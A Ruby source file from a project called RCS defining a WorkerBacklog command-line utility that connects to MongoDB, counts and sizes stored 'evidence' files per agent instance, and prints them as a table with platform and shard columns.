# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'

require_relative '../rcs-db/db'
require_relative '../rcs-db/grid'
require_relative '../rcs-db/evidence_dispatcher'

module RCS
module Worker

class WorkerBacklog
  include Singleton
  include RCS::Tracer

  def run(options)

    # config file parsing
    #return 1 unless Config.instance.load_from_file

    # connect to MongoDB
    return 1 unless RCS::DB::DB.instance.connect

    # calculate the number and the size of all the evidece for each instance
    entries = {}
    RCS::DB::GridFS.get_distinct_filenames("evidence").each do |inst|
      entries[inst] = {count: 0, size: 0}
      RCS::DB::GridFS.get_by_filename(inst, "evidence").each do |i|
        entries[inst][:count] += 1
        entries[inst][:size] += i["length"]
      end
    end

    # table definitions
    table_width = 117
    table_line = '+' + '-' * table_width + '+'

    # print the table header
    puts
    puts table_line
    puts '|' + 'instance'.center(57) + '|' + 'subtype'.center(12) + '|' +
         'shard'.center(25) + '|' + 'logs'.center(6) + '|' + 'size'.center(13) + '|'
    puts table_line

    entries.each_pair do |key, value|

      ident = key.slice(0..13)
      instance = key.slice(15..-1)
      agent = ::Item.agents.where({ident: ident, instance: instance}).first
      shard_id = RCS::DB::EvidenceDispatcher.instance.shard_id ident, instance

      puts "| #{key} |#{agent[:platform].center(12)}| #{shard_id.center(23)} |#{value[:count].to_s.rjust(5)} | #{value[:size].to_s_bytes.rjust(11)} |"
    end

    puts table_line
    puts

    return 0
  end

  # executed from rcs-worker-queue
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    DB.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-worker-queue [options] "

      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # execute the manager
    return WorkerBacklog.instance.run(options)
  end
end # EvidenceDispatcher

end # ::DB
end # ::RCS
